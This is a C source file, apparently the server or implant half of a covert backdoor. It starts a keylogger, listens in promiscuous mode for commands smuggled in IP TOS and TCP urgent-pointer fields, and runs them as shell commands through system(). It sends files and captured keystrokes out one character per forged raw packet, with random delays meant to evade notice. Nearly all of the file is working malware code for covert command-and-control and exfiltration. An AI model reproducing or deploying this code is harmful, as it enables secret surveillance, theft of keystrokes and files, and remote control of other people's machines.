/*==============================================================================
|   SOURCE:     server.c
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Source file for server program. Contains function calls that
|               pretain to server actions.
==============================================================================*/
#include "../include/server.h"
#include "../include/keylogger.h"
#include "../include/dir_watch.h"
#include <stdio.h>
#include <pcap/pcap.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>

/*------------------------------------------------------------------------------
|   FUNCTION:   int send_file(char *filename, char type, Server_Args *srv_args)
|                   *filename - name of file to send
|                   type - type of data packet will be holding
|                   *srv_args - contains IP of client to send to
|
|   RETURN:     0 on success, -1 on error
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Sends a file to client machine.
------------------------------------------------------------------------------*/
int send_file(char *filename, char type, Server_Args *srv_args)
{
    struct sockaddr_in sin;
    int delay;

    // create socket
    int sd;
    if((sd = create_socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return -1;

    // open file
    FILE *fp;
    fp = fopen(filename, "r");
    if(fp == NULL)
    {
        /* Send EOT */
        Packet pkt;

        delay = rand() % srv_args->max_delay + srv_args->min_delay;
        sleep(delay);

        // forge IP and TCP
        forge_ip(&pkt, type, inet_addr(srv_args->my_ip), inet_addr(srv_args->host_ip));
        forge_tcp(&pkt);

        // Set urgent pointer to null to specify end of output
        pkt.tcp.urg_ptr = '\0';

        // check sums
        pkt.ip.check = in_cksum((unsigned short *)&pkt.ip, sizeof(struct iphdr));
        pkt.tcp.check = in_cksum((unsigned short *)&pkt.tcp, sizeof(struct tcphdr));

        // check sums
        pkt.ip.check = in_cksum((unsigned short *)&pkt.ip, sizeof(struct iphdr));
        pkt.tcp.check = in_cksum((unsigned short *)&pkt.tcp, sizeof(struct tcphdr));

        // set sockaddr
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = pkt.ip.daddr;
        sin.sin_port = pkt.tcp.source;

        // send packet
        if(sendto(sd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sin, sizeof(sin)) == -1)
        {
            printf("\nError sending data: %s\n\n", strerror(errno));
            close(sd);
            return -1;
        }

        close(sd);
        return 0;
    }

    // Get size of file
    fseek(fp, 0L, SEEK_END);
    size_t size = ftell(fp);
    fseek(fp, 0L, SEEK_SET);

    // random seed
    time_t t;
    srand((unsigned) time(&t));

    if(size > 0) // if file not empty
    {
        int ch;
        while((ch = fgetc(fp)) != EOF)    // iterate char by char
        {
            Packet pkt;

            // delay sending
            int delay = rand() % srv_args->max_delay + srv_args->min_delay;
            sleep(delay);

            // forge IP and TCP
            forge_ip(&pkt, type, inet_addr(srv_args->my_ip), inet_addr(srv_args->host_ip));
            forge_tcp(&pkt);

            // Encode char into urgent pointer
            pkt.tcp.urg_ptr = ch;

            // check sums
            pkt.ip.check = in_cksum((unsigned short *)&pkt.ip, sizeof(struct iphdr));
            pkt.tcp.check = in_cksum((unsigned short *)&pkt.tcp, sizeof(struct tcphdr));

            // check sums
            pkt.ip.check = in_cksum((unsigned short *)&pkt.ip, sizeof(struct iphdr));
            pkt.tcp.check = in_cksum((unsigned short *)&pkt.tcp, sizeof(struct tcphdr));

            // set sockaddr
            sin.sin_family = AF_INET;
            sin.sin_addr.s_addr = pkt.ip.daddr;
            sin.sin_port = pkt.tcp.source;

            // send packet
            if(sendto(sd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sin, sizeof(sin)) == -1)
            {
                printf("\nError sending data: %s\n\n", strerror(errno));
                close(sd);
                return -1;
            }
        }
    }

    /* Send EOT */
    Packet pkt;

    delay = rand() % srv_args->max_delay + srv_args->min_delay;
    sleep(delay);

    // forge IP and TCP
    forge_ip(&pkt, type, inet_addr(srv_args->my_ip), inet_addr(srv_args->host_ip));
    forge_tcp(&pkt);

    // Set urgent pointer to null to specify end of output
    pkt.tcp.urg_ptr = '\0';

    // check sums
    pkt.ip.check = in_cksum((unsigned short *)&pkt.ip, sizeof(struct iphdr));
    pkt.tcp.check = in_cksum((unsigned short *)&pkt.tcp, sizeof(struct tcphdr));

    // check sums
    pkt.ip.check = in_cksum((unsigned short *)&pkt.ip, sizeof(struct iphdr));
    pkt.tcp.check = in_cksum((unsigned short *)&pkt.tcp, sizeof(struct tcphdr));

    // set sockaddr
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = pkt.ip.daddr;
    sin.sin_port = pkt.tcp.source;

    // send packet
    if(sendto(sd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sin, sizeof(sin)) == -1)
    {
        printf("\nError sending data: %s\n\n", strerror(errno));
        close(sd);
        return -1;
    }

    close(sd);
    return 0;
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void run_server(Server_Args srv_args)
|                   srg_args - srv_args to pass to lower level functions
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       High level function for running the server. Starts the keylogger
|               thread and runs the servers read loop.
------------------------------------------------------------------------------*/
void run_server(Server_Args srv_args)
{
    pthread_t keylog_thrd;
    memset(clt_cmd, '\0', sizeof(clt_cmd));

    pthread_create(&keylog_thrd, NULL, run_keylogger, (void *) &srv_args);
    run_read_loop(srv_args);
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void run_read_loop(Server_Args srv_args)
|                   srv_args - server arguments to pass to lower level functions
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Sets up libpcap and starts the libpcap read loop
------------------------------------------------------------------------------*/
void run_read_loop(Server_Args srv_args)
{
    struct bpf_program fp;
    pcap_if_t *interface_list;          /* List of nics */
    pcap_t *handle;                     /* Session handle */
    struct pcap_pkthdr header;	        /* The header that pcap gives us */
    const u_char *packet;		        /* The actual packet */
    char errbuff[PCAP_ERRBUF_SIZE];     /* Where pcap error messesages get written */

    // Find the first NIC that is up and sniff packets from it
    if(pcap_findalldevs(&interface_list, errbuff) == -1)
    {
        printf("%s\n",errbuff);
        return;
    }

    // Open the device for packet capture & set the device in promiscuous mode
    handle = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errbuff);
    if(handle == NULL)
    {
        printf("%s\n",errbuff);
        return;
    }

    // Compile the filter expression
    if(pcap_compile (handle, &fp, "tcp", 0, PCAP_NETMASK_UNKNOWN) == -1)
    {
        fprintf(stderr,"Error calling pcap_compile\n");
        return;
    }

    // Load the filter into the capture device
    if (pcap_setfilter(handle, &fp) == -1)
    {
        fprintf(stderr,"Error setting filter\n");
        return;
    }

    // run pcap loop
    pcap_loop(handle, -1, pcap_srv_callback, (u_char *)&srv_args);
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void process_clt_cmd(Server_Args *srv_args)
|                   *srv_args - contains IP of client to send data to
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Processes the command that it received from client. Based on
|               the command performs the according action.
------------------------------------------------------------------------------*/
void process_clt_cmd(Server_Args *srv_args)
{
    char *tmp = strdup(clt_cmd);
    char *token1 = strsep(&tmp, " ");
    char *token2;

    if(strcmp(clt_cmd, "exit") == 0)                // exit command
    {
        exit(1);
    }
    else if(strcmp(clt_cmd, "get KL") == 0)         // get keylogger command
    {
        send_file(FILE_KEY_LOGGER, 'k', srv_args);
        system("rm -f ../data/keylogger");
    }
    else if(strcmp(token1, CMD_GETFILE) == 0)       // exfiltration command
    {
        if((token2 = strsep(&tmp, " ")) != NULL)
            send_file(token2, 'x', srv_args);
    }
    else if(strcmp(token1, CMD_DW) == 0)            // directory watch command
    {
        if((token2 = strsep(&tmp, " ")) != NULL)
        {
            Dir_Watch_Args dw_args;
            dw_args.srv_args = *srv_args;
            strcpy(dw_args.dir, token2);
            pthread_t dir_watch_thrd;
            pthread_create(&dir_watch_thrd, NULL, run_dir_watch, (void *)&dw_args);
        }
    }
    else                                            // regular command
    {
        execute_cmd();
        send_file(FILE_OUTPUT, 'o', srv_args);
    }
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void execute_cmd()
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Executes the regular command in a terminal and writes the
|               output of the command to a file.
------------------------------------------------------------------------------*/
void execute_cmd()
{
    strcat(clt_cmd, " > ../data/output");
    system("rm -f ../data/output");
    system(clt_cmd);
    fflush(stdout);
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void pcap_srv_callback(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
|                   *args - function arguments
|                   *header - pcap header structure
|                   *packet - packet thats captures
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Function that gets called whenever a TCP packet is received.
|               Checks to see if the the packet contains command data from the
\               client and acts accordingly.
------------------------------------------------------------------------------*/
void pcap_srv_callback(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    Server_Args *srv_args = (Server_Args *)args;
    struct iphdr *ip;
    struct tcphdr *tcp;
    int eth_size = sizeof(struct ether_header);
    int ip_size;

    // get IP header
    ip = (struct iphdr *)(packet + eth_size);
    ip_size = ip->ihl*4;        // get IP header size

    if(ip->tos == 'c')
    {
        // get TCP header
        tcp = (struct tcphdr *)(packet + eth_size + ip_size);

        if(tcp->urg_ptr == '\n')
        {
            printf("cmd: %s\n", clt_cmd);
            fflush(stdout);
            process_clt_cmd(srv_args);
            memset(clt_cmd, '\0', sizeof(clt_cmd));
        }
        else
            clt_cmd[strlen(clt_cmd)] = tcp->urg_ptr;
    }
}
